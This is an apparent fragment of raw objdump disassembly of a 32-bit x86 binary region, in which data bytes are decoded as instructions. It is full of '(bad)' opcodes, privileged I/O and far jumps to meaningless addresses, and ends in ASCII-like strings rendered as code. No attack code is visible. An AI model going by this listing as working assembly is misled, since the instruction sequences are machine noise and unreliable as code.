  423186:	pop    esi
  423187:	inc    edi
  423188:	and    eax,0x85b574df
  42318d:	sbb    BYTE PTR [ecx],cl
  42318f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423190:	mov    ah,0x43
  423192:	sub    edx,DWORD PTR [edx+eiz*4-0x39]
  423196:	mov    ah,0xcb
  423198:	ins    DWORD PTR es:[edi],dx
  423199:	sbb    edx,ecx
  42319b:	imul   ecx,esp,0x51a5259
  4231a1:	sbb    eax,0x906d83f3
  4231a6:	jbe    0x4231c7
  4231a8:	std    
  4231a9:	inc    eax
  4231aa:	fstp   DWORD PTR [edi+0x1635d88c]
  4231b0:	inc    esp
  4231b1:	jp     0x42314c
  4231b3:	push   ebx
  4231b4:	lods   eax,DWORD PTR ds:[esi]
  4231b5:	dec    edi
  4231b6:	add    BYTE PTR [bx+si],al
	...
  4231c1:	add    BYTE PTR [edi],ah
  4231c3:	push   ecx
  4231c4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231ce:	sub    al,0x17
  4231d0:	jle    0x423235
  4231d2:	push   ss
  4231d3:	fld    QWORD PTR [ecx]
  4231d5:	add    BYTE PTR [ebp+0x0],bl
  4231d8:	add    BYTE PTR [eax],al
  4231da:	aas    
  4231db:	popa   
  4231dc:	lods   al,BYTE PTR ds:[esi]
  4231dd:	xchg   ebp,esp
  4231df:	scas   eax,DWORD PTR es:[edi]
  4231e0:	dec    edi
  4231e1:	lea    ebx,[edi+eax*1]
  4231e4:	popf   
  4231e5:	pop    es
  4231e6:	mov    ah,0x0
  4231e8:	in     al,0x99
  4231ea:	popf   
  4231eb:	nop
  4231ec:	pop    esi
  4231ed:	(bad)
  4231f0:	dec    esi
  4231f1:	dec    edi
  4231f2:	clc    
  4231f3:	inc    edx
  4231f4:	jo     0x423251
  4231f6:	push   eax
  4231f7:	pop    eax
  4231f8:	stos   DWORD PTR es:[edi],eax
  4231f9:	popa   
  4231fa:	mov    WORD PTR [edi],fs
  4231fc:	add    al,0x3d
  4231fe:	addr16 (bad) 
  423200:	cmp    al,0x7a
  423202:	neg    bh
  423204:	stc    
  423205:	push   ecx
  423206:	fstp   DWORD PTR [edi]
  423208:	test   ecx,ebx
  42320a:	mov    es,WORD PTR [ecx]
  42320c:	sub    eax,0x745896ce
  423211:	popf   
  423212:	ins    DWORD PTR es:[edi],dx
  423213:	dec    ecx
  423214:	sub    eax,0x1f46ec9a
  423219:	add    al,0xc2
  42321b:	add    DWORD PTR [edx],eax
  42321d:	xchg   ebx,eax
  42321e:	out    dx,al
  42321f:	(bad)  
  423220:	loope  0x423225
  423222:	repnz inc edx
  423224:	add    DWORD PTR [edx-0x14118af5],ebp
  42322a:	adc    edx,DWORD PTR [edx+edi*1+0x7b5d88d3]
  423231:	fild   DWORD PTR [ecx+esi*2]
  423234:	adc    ah,BYTE PTR [ebp+0x5e]
	...
  42323f:	add    BYTE PTR [eax],al
  423241:	add    BYTE PTR [edi],ah
  423243:	ss lahf 
  423245:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42324b:	and    eax,0x6d0e075b
  423250:	enter  0x731f,0xdd
  423254:	add    DWORD PTR [eax],eax
  423256:	pop    ebp
  423257:	add    BYTE PTR [eax],al
  423259:	add    BYTE PTR [ebx+0x443c1ee3],ch
  42325f:	rol    esi,0x27
  423262:	aaa    
  423263:	and    WORD PTR [ecx],si
  423266:	call   0xa475b488
  42326b:	mov    bh,0xc5
  42326d:	push   ds
  42326e:	push   edx
  42326f:	dec    edx
  423270:	cli    
  423271:	sahf   
  423272:	sbb    al,0x12
  423274:	inc    ebx
  423275:	dec    ebx
  423276:	and    BYTE PTR [edx+eax*8+0xa9df165],dh
  42327d:	jle    0x4232a1
  42327f:	push   ebp
  423280:	inc    esp
  423281:	js     0x42322b
  423283:	addr16 aas 
  423285:	fisttp WORD PTR [ebp+eax*8+0x72ba611d]
  42328c:	hlt    
  42328d:	sahf   
  42328e:	cld    
  42328f:	ret    0x43d8
  423292:	sub    ebx,edi
  423294:	dec    ecx
  423295:	mov    al,0x35
  423297:	leave  
  423298:	shl    BYTE PTR ds:0x2835d190,cl
  42329e:	push   ds
  42329f:	cld    
  4232a0:	addr16 pop ebx
  4232a2:	jb     0x423252
  4232a4:	mov    edi,0x2b7990ed
  4232a9:	in     al,0xe5
  4232ab:	dec    esi
  4232ac:	xchg   esi,eax
  4232ad:	mov    bl,0x0
  4232af:	outs   dx,DWORD PTR ds:[esi]
  4232b0:	pop    ds
  4232b1:	add    al,bh
  4232b3:	data16 (bad) 
  4232b5:	cmc    
  4232b6:	sbb    eax,0x0
  4232bb:	add    BYTE PTR [eax],al
  4232bd:	add    BYTE PTR [eax],al
  4232bf:	add    BYTE PTR [eax],al
  4232c1:	add    BYTE PTR [edi],dh
  4232c3:	(bad)  
  4232c4:	out    0xc2,eax
  4232c6:	mul    ebx
  4232c8:	aaa    
  4232c9:	cmc    
  4232ca:	xchg   ecx,eax
  4232cb:	call   0x5357:0xb325eef4
  4232d2:	rcr    ch,1
  4232d4:	add    DWORD PTR [eax],eax
  4232d6:	pop    ebp
  4232d7:	add    BYTE PTR [eax],al
  4232d9:	add    BYTE PTR [ebp+0x3514a7e1],ah
  4232df:	inc    ebp
  4232e0:	xor    ebp,eax
  4232e2:	dec    edx
  4232e3:	outs   dx,DWORD PTR ds:[esi]
  4232e4:	jge    0x4232c9
  4232e6:	mov    ecx,0xae255b3e
  4232eb:	or     al,0x1e
  4232ed:	(bad)  
  4232ee:	sub    cl,ah
  4232f0:	push   ebp
  4232f1:	push   esi
  4232f2:	adc    BYTE PTR [edx],bh
  4232f4:	sbb    bh,dl
  4232f6:	inc    edx
  4232f7:	scas   al,BYTE PTR es:[edi]
  4232f8:	cmp    al,0xf1
  4232fa:	retf   0x937d
  4232fd:	or     eax,0xb8381a8e
  423302:	std    
  423303:	sub    esp,DWORD PTR [edi]
  423305:	inc    esi
  423306:	loope  0x4232ef
  423308:	sbb    eax,DWORD PTR [ebx+0x3d50e6f2]
  42330e:	fst    DWORD PTR ds:0x965f679f
  423314:	ja     0x423339
  423316:	jb     0x423317
  423318:	pop    ebp
  423319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42331a:	(bad)  
  42331b:	imul   ebx,DWORD PTR [edx+eiz*1+0x38],0x728d0e55
  423323:	and    BYTE PTR [eax-0x6],cl
  423326:	ja     0x423370
  423328:	fimul  WORD PTR [eax]
  42332a:	lods   al,BYTE PTR ds:[esi]
  42332b:	push   ebp
  42332c:	fisubr WORD PTR [ebx+eax*8]
  42332f:	cmc    
  423330:	ja     0x42339a
  423332:	lods   al,BYTE PTR ds:[esi]
  423333:	dec    ebp
  423334:	sub    dl,BYTE PTR [esi+0xb5]
	...
  423342:	push   ss
  423343:	aad    0xdf
  423345:	out    dx,eax
  423346:	fucomip st,st(7)
  423348:	ss std 
  42334a:	cmp    BYTE PTR [esi+0x50d5f3a],al
  423350:	ja     0x423355
  423352:	sub    eax,0x5d0001de
  423357:	add    BYTE PTR [eax],al
  423359:	add    BYTE PTR [edx+0xb],bl
  42335c:	jmp    FWORD PTR [ecx+0x1e48f4e]
  423362:	pushf  
  423363:	fcomp  DWORD PTR [edi+0x2fa41495]
  423369:	aad    0x2
  42336b:	shl    BYTE PTR [esi-0x71],1
  42336e:	sti    
  42336f:	push   ds
  423370:	mov    WORD PTR [edx-0x7a],ds
  423373:	mov    ebx,fs
  423375:	lahf   
  423376:	popf   
  423377:	stc    
  423378:	and    al,0x30
  42337a:	fs xchg edi,eax
  42337c:	repnz push edx
  42337e:	and    al,0x5f
  423380:	push   ebx
  423381:	adc    edi,DWORD PTR [ecx]
  423383:	dec    ebx
  423384:	je     0x4233c4
  423386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423387:	dec    ebp
  423388:	xchg   esi,eax
  423389:	hlt    
  42338a:	jns    0x42331f
  42338c:	push   cs
  42338d:	inc    eax
  42338e:	jns    0x423395
  423390:	sahf   
  423391:	mov    ebp,DWORD PTR [edi-0x47e71c0f]
  423397:	mov    al,0xad
  423399:	inc    ebx
  42339a:	int    0xe1
  42339c:	sbb    BYTE PTR [edx],al
  42339e:	js     0x4233e8
  4233a0:	jl     0x423329
  4233a2:	enter  0x725b,0x4a
  4233a6:	idiv   DWORD PTR [edi-0x7da65145]
  4233ac:	sar    BYTE PTR [ecx],cl
  4233ae:	jp     0x4233cf
  4233b0:	mov    bl,0x3c
  4233b2:	pop    ebx
  4233b3:	sbb    DWORD PTR [edx+0x29],ecx
  4233b6:	pop    ebx
	...
  4233bf:	add    BYTE PTR [eax],al
  4233c1:	add    BYTE PTR [esi+0x76],ch
  4233c4:	in     al,0xca
  4233c6:	cld    
  4233c7:	fisubr DWORD PTR [esi-0xa]
  4233ca:	sbb    BYTE PTR [edx+0x44d09787],dl
  4233d0:	pusha  
  4233d1:	inc    esp
  4233d2:	mov    bl,dh
  4233d4:	add    DWORD PTR [eax],eax
  4233d6:	pop    ebp
  4233d7:	add    BYTE PTR [eax],al
  4233d9:	add    ah,ah
  4233db:	xchg   esi,esp
  4233dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233de:	dec    edi
  4233df:	mov    ebx,0x38bf25ba
  4233e4:	test   eax,0x45a169e3
  4233e9:	push   cs
  4233ea:	sub    BYTE PTR [ecx],dl
  4233ec:	ins    BYTE PTR es:[edi],dx
  4233ed:	out    0xe0,eax
  4233ef:	push   ebx
  4233f0:	or     DWORD PTR ds:[esi-0x2cfaeaf3],edi
  4233f7:	cmp    DWORD PTR [ecx-0x57082357],edi
  4233fd:	ins    BYTE PTR es:[edi],dx
  4233fe:	retf   0x6d75
  423401:	mov    dh,0x96
  423403:	cmp    bl,BYTE PTR [ecx+0x5c68cacd]
  423409:	xor    eax,0xfdae0d6e
  42340e:	inc    ebx
  42340f:	mov    edi,0x5c0c8575
  423414:	hlt    
  423415:	daa    
  423416:	push   esi
  423417:	std    
  423418:	sub    ecx,edi
  42341a:	or     eax,0x434e8477
  42341f:	inc    esi
  423420:	fmul   QWORD PTR [esi-0x61]
  423423:	mov    edx,DWORD PTR [eax+ebp*8-0x66d290bf]
  42342a:	push   edx
  42342b:	sahf   
  42342c:	in     eax,0x7e
  42342e:	inc    bx
  423430:	xor    BYTE PTR [edx-0x4344e69b],ch
  423436:	stc    
	...
  42343f:	add    BYTE PTR [eax],al
  423441:	add    BYTE PTR [edx],bh
  423443:	push   edx
  423444:	les    ecx,FWORD PTR [edi]
  423446:	in     al,dx
  423447:	lahf   
  423448:	sti    
  423449:	ja     0x423441
  42344b:	rcl    DWORD PTR [eax+0x10772ed3],1
  423451:	daa    
  423452:	out    0xde,eax
  423454:	add    DWORD PTR [eax],eax
  423456:	pop    ebp
  423457:	add    BYTE PTR [eax],al
  423459:	add    BYTE PTR [edi+0x6f],bh
  42345c:	ins    DWORD PTR es:[edi],dx
  42345d:	cli    
  42345e:	cmp    eax,0x68074592
  423463:	ds out dx,eax
  423465:	jb     0x423460
  423467:	(bad)  
  423468:	ja     0x4233fa
  42346a:	add    eax,DWORD PTR [eax]
  42346c:	jns    0x4233f4
  42346e:	or     eax,0xd244f23a
  423473:	adc    eax,0x6e2a60c0
  423478:	sti    
  423479:	fist   WORD PTR [edi+0x66aefd05]
  42347f:	dec    eax
  423480:	out    dx,eax
  423481:	push   edx
  423482:	inc    ebx
  423483:	stc    
  423484:	cmc    
  423485:	mov    eax,0xdf9cd894
  42348a:	fucomp st(7)
  42348c:	or     dl,BYTE PTR [esi]
  42348e:	xor    ebp,DWORD PTR [edx+0x2c7aeb03]
  423494:	lahf   
  423495:	popa   
  423496:	sub    esp,DWORD PTR [ecx+ebx*1-0x6a682b7a]
  42349d:	mov    eax,0x9822d281
  4234a2:	int    0x62
  4234a4:	aad    0x27
  4234a6:	es out dx,al
  4234a8:	add    DWORD PTR [ecx-0x55b56c7d],ecx
  4234ae:	xor    ch,bh
  4234b0:	push   ebx
  4234b1:	sub    eax,0xb92f3363
	...
  4234c2:	xchg   ebx,eax
  4234c3:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  4234ca:	push   eax
  4234cb:	loopne 0x4234c7
  4234cd:	call   0xdf44:0x823deb4e
  4234d4:	add    DWORD PTR [eax],eax
  4234d6:	pop    ebp
  4234d7:	add    BYTE PTR [eax],al
  4234d9:	add    dl,ch
  4234db:	scas   eax,DWORD PTR es:[edi]
  4234dc:	cmp    eax,0x2a96d899
  4234e1:	mov    bh,0x65
  4234e3:	es dec esi
  4234e5:	stc    
  4234e6:	outs   dx,BYTE PTR ds:[esi]
  4234e7:	mov    ss,WORD PTR [ecx+ecx*1]
  4234ea:	mov    ah,0xaa
  4234ec:	daa    
  4234ed:	je     0x4234d8
  4234ef:	outs   dx,DWORD PTR ds:[esi]
  4234f0:	lods   eax,DWORD PTR ds:[esi]
  4234f1:	ret    
  4234f2:	xchg   ecx,eax
  4234f3:	dec    ebp
  4234f4:	add    DWORD PTR [eax-0x61],ebx
  4234f7:	pop    ss
  4234f8:	pushf  
  4234f9:	xchg   DWORD PTR [eax+edx*8],esi
  4234fc:	loopne 0x4234cc
  4234fe:	cmc    
  4234ff:	jp     0x4234a1
  423501:	rol    DWORD PTR [eax+0x741d4fd9],1
  423507:	push   0x7d
  423509:	mov    eax,ds:0xfeee09c4
  42350e:	jb     0x4234e2
  423510:	or     al,0xaf
  423512:	or     bl,BYTE PTR [esi-0x53]
  423515:	xchg   ecx,eax
  423516:	or     eax,0x9fbe880b
  42351b:	addr16 leave 
  42351d:	test   al,0xc8
  42351f:	ins    DWORD PTR es:[edi],dx
  423520:	dec    di
  423522:	cmp    cl,ah
  423524:	je     0x4234df
  423526:	sbb    dl,bh
  423528:	fwait
  423529:	rcr    DWORD PTR [edx+0x5affc41],cl
  42352f:	call   FWORD PTR [edi-0xb]
  423532:	sub    ebp,DWORD PTR [esi+0x74a7b3]
	...
  423540:	add    BYTE PTR [eax],al
  423542:	(bad)  
  423544:	test   eax,0xddffeef7
  42354a:	and    al,0x1
  42354c:	pop    ebp
  42354d:	dec    edi
  42354e:	mov    esp,0xa1b5f469
  423553:	fild   WORD PTR [ecx]
  423555:	add    BYTE PTR [ebp+0x0],bl
  423558:	add    BYTE PTR [eax],al
  42355a:	shl    DWORD PTR [edx+0x34],cl
  42355d:	in     eax,dx
  42355e:	lahf   
  42355f:	dec    esp
  423560:	sbb    ch,BYTE PTR [eax+0x61152fba]
  423566:	sbb    DWORD PTR [edi-0x4e],ebp
  423569:	js     0x42357f
  42356b:	and    eax,0x773bcaa2
  423570:	ins    BYTE PTR es:[edi],dx
  423571:	mov    eax,ds:0xafd37685
  423576:	xor    eax,0xcb1a3d3d
  42357b:	clc    
  42357c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42357e:	pop    edi
  42357f:	ins    BYTE PTR es:[edi],dx
  423580:	mov    eax,0x61937fa5
  423585:	jg     0x4235de
  423587:	push   edi
  423588:	mov    bh,0x1a
  42358a:	pop    esi
  42358b:	xchg   ebp,eax
  42358c:	jg     0x4235ea
  42358e:	shl    ch,cl
  423590:	push   0xc0dbe091
  423595:	repz int 0x39
  423598:	or     DWORD PTR [ecx*1-0xce6b8ed],0x74315221
  4235a3:	pop    esi
  4235a4:	jmp    0x821747f2
  4235a9:	jbe    0x423567
  4235ab:	ins    BYTE PTR es:[edi],dx
  4235ac:	inc    ecx
  4235ad:	xchg   ebx,eax
  4235ae:	rcr    cl,cl
  4235b0:	out    0x9,al
  4235b2:	cmp    dh,BYTE PTR [ebp-0x6b]
  4235b5:	ins    BYTE PTR es:[edi],dx
  4235b6:	jecxz  0x4235b8
	...
  4235c0:	add    BYTE PTR [eax],al
  4235c2:	outs   dx,DWORD PTR ds:[esi]
  4235c3:	mov    ds:0x7edd2ad4,al
  4235c8:	jmp    edi
  4235ca:	push   edx
  4235cb:	fcmovu st,st(5)
  4235cd:	in     eax,0xdf
  4235cf:	ds ss leave 
  4235d2:	(bad)  
  4235d3:	fild   WORD PTR [ecx]
  4235d5:	add    BYTE PTR [ebp+0x0],bl
  4235d8:	add    BYTE PTR [eax],al
  4235da:	stc    
  4235db:	sahf   
  4235dc:	and    DWORD PTR [ebx],ecx
  4235de:	pop    ecx
  4235df:	sbb    BYTE PTR [eax+0x5a4ccb4],bh
  4235e5:	jbe    0x423665
  4235e7:	into   
  4235e8:	mov    edx,0xa757c994
  4235ed:	std    
  4235ee:	sbb    esp,DWORD PTR [eax+edx*1+0x3ec6b4ad]
  4235f5:	out    dx,eax
  4235f6:	aad    0x73
  4235f8:	push   edi
  4235f9:	cmp    eax,0xea009620
  4235fe:	iret   
  4235ff:	repz ret 
  423601:	xchg   esi,eax
  423602:	sbb    esp,DWORD PTR [ebx]
  423604:	jecxz  0x423676
  423606:	int3   
  423607:	pop    edi
  423608:	cdq    
  423609:	add    eax,0xfebd6b6f
  42360e:	cmp    BYTE PTR [edi-0x4d4a7bd7],ch
  423614:	test   al,0x26
  423616:	xchg   edi,eax
  423617:	dec    esi
  423618:	mov    ds:0x777ec442,al
  42361d:	or     al,0x9e
  42361f:	pop    esi
  423620:	add    DWORD PTR [ebx],ebp
  423622:	ret    0x2ba6
  423625:	push   0x67d77173
  42362a:	imul   edx,DWORD PTR [ecx+0x49],0xfb50793d
  423631:	sbb    al,0x98
  423633:	hlt    
  423634:	hlt    
  423635:	in     al,0xd5
	...
  42363f:	add    BYTE PTR [eax],al
  423641:	add    cl,bh
  423643:	sbb    al,al
  423645:	inc    esi
  423646:	jecxz  0x423626
  423648:	(bad)  
  423649:	mov    edi,0xe1f1bc83
  42364e:	sub    DWORD PTR [eax-0x1fa401ae],edi
  423654:	add    DWORD PTR [eax],eax
  423656:	pop    ebp
  423657:	add    BYTE PTR [eax],al
  423659:	add    dh,ch
  42365b:	inc    ebp
  42365c:	or     al,BYTE PTR [esi*8+0x7d89d2a2]
  423663:	retf   
  423664:	xchg   esp,eax
  423665:	add    DWORD PTR [ecx],ebp
  423667:	push   edi
  423668:	js     0x4236a1
  42366a:	into   
  42366b:	mov    ds:0xa5a02ec0,eax
  423670:	in     eax,0x55
  423672:	push   cs
  423673:	mov    ch,0x82
  423675:	mov    edx,0xc20c9a80
  42367a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42367b:	mov    ds,WORD PTR [esi-0x682a06d]
  423681:	xor    eax,DWORD PTR [edi+0x2]
  423684:	imul   esp,DWORD PTR [edi+edi*1+0x64d8d0cf],0x5a448481
  42368f:	xchg   ecx,eax
  423690:	loop   0x4236b9
  423692:	xor    al,0x2
  423694:	out    0xa8,al
  423696:	inc    ebp
  423697:	and    edi,ebx
  423699:	xchg   BYTE PTR [ecx+ebx*1],cl
  42369c:	aad    0xe9
  42369e:	leave  
  42369f:	adc    BYTE PTR [ebx+0x2321b4ba],bl
  4236a5:	adc    DWORD PTR [esi+ecx*4+0x30],ebx
  4236a9:	add    al,0x5d
  4236ab:	dec    ebx
  4236ac:	jmp    0x2d65:0xce95d32e
  4236b3:	mov    dl,0xd8
  4236b5:	scas   al,BYTE PTR es:[edi]
  4236b6:	add    eax,0x0
  4236bb:	add    BYTE PTR [eax],al
  4236bd:	add    BYTE PTR [eax],al
  4236bf:	add    BYTE PTR [eax],al
  4236c1:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4236c7:	(bad)  
  4236c8:	mov    ch,0xbb
  4236ca:	icebp  
  4236cb:	and    eax,0xc79f8c27
  4236d0:	icebp  
  4236d1:	popa   
  4236d2:	mov    eax,0x5d0001e0
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    BYTE PTR [esi-0x3131d685],bh
  4236df:	jp     0x42369a
  4236e1:	jo     0x42375b
  4236e3:	aad    0xdd
  4236e5:	pop    edi
  4236e6:	xchg   ecx,eax
  4236e7:	sub    bl,BYTE PTR [edi+0x5d]
  4236ea:	xchg   ebp,eax
  4236eb:	adc    BYTE PTR [edi-0x53],cl
  4236ee:	ins    DWORD PTR es:[edi],dx
  4236ef:	call   0xf2a7a016
  4236f4:	pop    edi
  4236f5:	cmp    BYTE PTR [ecx+0x1d],bl
  4236f8:	pop    es
  4236f9:	mov    ebx,0x94e002cb
  4236fe:	xor    dh,al
  423700:	mov    cl,0x1f
  423702:	mov    eax,ds:0x562248c1
  423707:	fs sbb al,0x64
  42370a:	neg    dh
  42370c:	xchg   edi,eax
  42370d:	adc    BYTE PTR [esi+edx*4],cl
  423710:	mov    ch,BYTE PTR [edx+0x3c28363c]
  423716:	shr    BYTE PTR [edx+edi*1],cl
  423719:	rol    esp,cl
  42371b:	push   cs
  42371c:	add    eax,0x82e4b18c
  423721:	jge    0x42373b
  423723:	cmp    DWORD PTR [ebx-0x6f],0xffffffde
  423727:	dec    edi
  423728:	add    edi,edi
  42372a:	pushf  
  42372b:	cmp    ah,0x65
  42372e:	xchg   esp,eax
  42372f:	or     ch,BYTE PTR [eax]
  423731:	mov    DWORD PTR [edi-0x41],esp
  423734:	scas   eax,DWORD PTR es:[edi]
  423735:	adc    eax,0x3c
	...
  423742:	adc    dl,bh
  423744:	repz or esi,edi
  423747:	das    
  423748:	cli    
  423749:	fist   WORD PTR [ecx]
  42374b:	dec    ebx
  42374c:	es nop
  42374e:	lds    esp,FWORD PTR [eax]
  423750:	(bad)  
  423751:	loopne 0x423768
  423753:	loope  0x423756
  423755:	add    BYTE PTR [ebp+0x0],bl
  423758:	add    BYTE PTR [eax],al
  42375a:	inc    esp
  42375b:	aad    0x83
  42375d:	push   cs
  42375e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42375f:	xbegin 0xaea2969c
  423765:	inc    ebp
  423766:	stos   DWORD PTR es:[edi],eax
  423767:	cmp    dh,BYTE PTR [edi+ebp*4-0x7e]
  42376b:	inc    esp
  42376c:	adc    ebp,DWORD PTR [esp+eax*2]
  42376f:	sub    cl,ah
  423771:	scas   eax,DWORD PTR es:[edi]
  423772:	fiadd  WORD PTR [edi+0x2e52d747]
  423778:	add    dh,BYTE PTR [esi+ecx*8-0x569e545e]
  42377f:	and    dl,BYTE PTR [ebp-0x39]
  423782:	and    al,0x8
  423784:	jmp    0x2810:0x7fe19776
  42378b:	test   al,0x38
  42378d:	(bad)  
  42378e:	arpl   WORD PTR [ebp-0x2],di
  423791:	adc    edi,0x2f
  423794:	inc    eax
  423795:	test   DWORD PTR [ecx+0x878bb35],ebx
  42379b:	call   0xd3ad:0x6adba0ee
  4237a2:	jae    0x42372e
  4237a4:	xchg   edi,eax
  4237a5:	je     0x4237c8
  4237a7:	(bad)  
  4237a8:	das    
  4237a9:	mov    edx,0xc8fd8d60
  4237ae:	dec    ebp
  4237af:	jl     0x42375a
  4237b1:	fsubp  st(6),st
  4237b3:	fisub  WORD PTR [bx+si+0x78]
	...
  4237c3:	rol    BYTE PTR [edx+0x0],0x4
  4237c7:	rol    BYTE PTR [edx+0x0],0x8
  4237cb:	rol    BYTE PTR [edx+0x0],0xc
  4237cf:	rol    BYTE PTR [edx+0x0],0x10
  4237d3:	rol    BYTE PTR [edx+0x0],0x14
  4237d7:	rol    BYTE PTR [edx+0x0],0x18
  4237db:	rol    BYTE PTR [edx+0x0],0x1c
  4237df:	rol    BYTE PTR [edx+0x0],0x57
  4237e3:	inc    edi
  4237e4:	cmp    DWORD PTR [edi+0x41],ebx
  4237e7:	pop    eax
  4237e8:	ss push esi
  4237ea:	pop    edi
  4237eb:	cmp    BYTE PTR [eax],al
  4237ed:	inc    ebx
  4237ee:	inc    ebp
  4237ef:	dec    esp
  4237f0:	pop    edi
  4237f1:	pop    eax
  4237f2:	push   edi
  4237f3:	dec    eax
  4237f4:	inc    edx
  4237f5:	add    BYTE PTR [edi+0x50],dl
  4237f8:	xor    eax,0x4641365f
  4237fd:	cmp    DWORD PTR [edx],esi
  4237ff:	xor    ebx,DWORD PTR [edi+0x32]
  423802:	aaa    
  423803:	add    BYTE PTR [eax+0x48],dl
  423806:	xor    BYTE PTR [edi+0x58],bl
  423809:	push   esp
  42380a:	inc    ecx
  42380b:	dec    ebp
  42380c:	push   ecx
  42380d:	pop    edi
  42380e:	inc    esi
  42380f:	push   ebp
  423810:	cmp    DWORD PTR [eax],eax
  423812:	push   edi
  423813:	push   ebp
  423814:	inc    ecx
  423815:	xor    dh,BYTE PTR [ebx]
  423817:	xor    ebx,DWORD PTR [edi+0x4e]
  42381a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42381e:	cmp    DWORD PTR [edi+0x38],ebx
  423821:	dec    ecx
  423822:	cmp    DWORD PTR [edx+0x36],ebx
  423825:	pop    edi
  423826:	dec    edx
  423827:	xor    BYTE PTR [edx+0x34],cl
  42382a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42382e:	xor    esi,DWORD PTR [eax]
  423830:	pop    edi
  423831:	inc    edx
  423832:	dec    ebx
  423833:	pop    eax
  423834:	pop    eax
  423835:	xor    eax,0x51414d00
  42383a:	pop    edi
  42383b:	inc    ecx
  42383c:	xor    al,BYTE PTR [ebp+0x5f]
  42383f:	inc    ecx
  423840:	dec    ebx
  423841:	cmp    DWORD PTR ds:0x5a003939,esi
  423847:	inc    ebp
  423848:	cmp    BYTE PTR [edi+0x4d],bl
  42384b:	ss dec eax
  42384d:	dec    ebx
  42384e:	add    BYTE PTR [ebp+0x57],al
  423851:	xor    DWORD PTR [edi+0x31],ebx
  423854:	dec    ebx
  423855:	xor    eax,DWORD PTR [ecx+0x30]
  423858:	push   ebx
  423859:	add    BYTE PTR [edx+esi*1+0x36],al
  42385d:	aaa    
  42385e:	pop    edi
  42385f:	push   edx
  423860:	dec    eax
  423861:	dec    ebp
  423862:	cmp    BYTE PTR [edi+0x37],bl
  423865:	inc    esi
  423866:	xor    eax,0x43355500
  42386b:	pop    edi
  42386c:	pop    ecx
  42386d:	dec    ecx
  42386e:	push   ebx
  42386f:	xor    bl,BYTE PTR [edi+0x52]
  423872:	add    BYTE PTR [eax+0x55],dl
  423875:	dec    ecx
  423876:	xor    BYTE PTR [edi+0x43],bl
  423879:	ss inc ebp
  42387b:	xor    bl,BYTE PTR [edi+0x4d]
  42387e:	xor    al,0x4a
  423880:	push   edx
  423881:	push   ebp
  423882:	add    BYTE PTR [esi+0x39],cl
  423885:	push   eax
  423886:	pop    edi
  423887:	push   ebp
  423888:	cmp    DWORD PTR [esi],esi
  42388a:	xor    BYTE PTR [ecx],dh
  42388c:	pop    edi
  42388d:	dec    edi
  42388e:	dec    esi
  42388f:	push   esp
  423890:	cmp    BYTE PTR [eax],al
  423892:	dec    esp
  423893:	xor    al,0x44
  423895:	xor    DWORD PTR [edi+0x4b],ebx
  423898:	xor    DWORD PTR [ebp+0x5f],eax
  42389b:	pop    edx
  42389c:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238a0:	pop    edi
  4238a1:	inc    edx
  4238a2:	xor    dh,BYTE PTR [ecx]
  4238a4:	push   ebx
  4238a5:	xor    DWORD PTR [ecx],edi
  4238a7:	inc    edx
  4238a8:	add    BYTE PTR [edi+0x45],al
  4238ab:	xor    al,0x38
  4238ad:	xor    BYTE PTR [eax],dh
  4238af:	pop    edi
  4238b0:	dec    edx
  4238b1:	dec    ebx
  4238b2:	xor    eax,0x33345f4d
  4238b7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238bb:	pop    edi
  4238bc:	aaa    
  4238bd:	push   esi
  4238be:	dec    ebx
  4238bf:	push   edx
  4238c0:	pop    edi
  4238c1:	inc    ebx
  4238c2:	add    BYTE PTR [edx+0x35],bl
  4238c5:	dec    ebp
  4238c6:	pop    edi
  4238c7:	inc    edi
  4238c8:	dec    esi
  4238c9:	xor    al,0x49
  4238cb:	xor    eax,0x54590035
  4238d0:	push   edx
  4238d1:	pop    edi
  4238d2:	push   esp
  4238d3:	inc    ebx
  4238d4:	inc    ecx
  4238d5:	pop    edi
  4238d6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238d9:	push   ebp
  4238da:	pop    edi
  4238db:	push   ebp
  4238dc:	inc    ebp
  4238dd:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238e1:	pop    edi
  4238e2:	pop    eax
  4238e3:	dec    edx
  4238e4:	inc    edx
  4238e5:	inc    edi
  4238e6:	add    BYTE PTR [edx+0x36],al
  4238e9:	inc    ebx
  4238ea:	pop    edi
  4238eb:	xor    BYTE PTR ds:0x36464b,dh
  4238f1:	dec    ebx
  4238f2:	cmp    DWORD PTR [esi+0x37],eax
  4238f5:	xor    ebx,DWORD PTR [edi+0x35]
  4238f8:	ss inc edi
  4238fa:	pop    ecx
  4238fb:	dec    eax
  4238fc:	pop    ecx
  4238fd:	add    BYTE PTR [ebp+0x35],cl
  423900:	push   eax
  423901:	xor    BYTE PTR [edi+0x4f],bl
  423904:	pop    ecx
  423905:	xor    cl,BYTE PTR [edi+0x0]
  423908:	pop    ecx
  423909:	xor    DWORD PTR [esi+0x5f],ecx
  42390c:	xor    al,BYTE PTR [edx+0x30]
  42390f:	push   esi
  423910:	push   esp
  423911:	inc    ebp
  423912:	add    BYTE PTR [edi+0x37],al
  423915:	push   esi
  423916:	xor    DWORD PTR [edi+0x49],ebx
  423919:	xor    al,BYTE PTR [esi+0x30]
  42391c:	pop    edi
  42391d:	ss dec esi
  42391f:	cmp    BYTE PTR [eax],al
  423921:	pop    edx
  423922:	xor    eax,0x445f334b
  423927:	xor    BYTE PTR [eax],bh
  423929:	push   ecx
  42392a:	push   esi
  42392b:	xor    al,0x0
  42392d:	push   ebp
  42392e:	pop    eax
  42392f:	inc    edi
  423930:	xor    DWORD PTR [edi+0x39],ebx
  423933:	push   esp
  423934:	inc    ebx
  423935:	aaa    
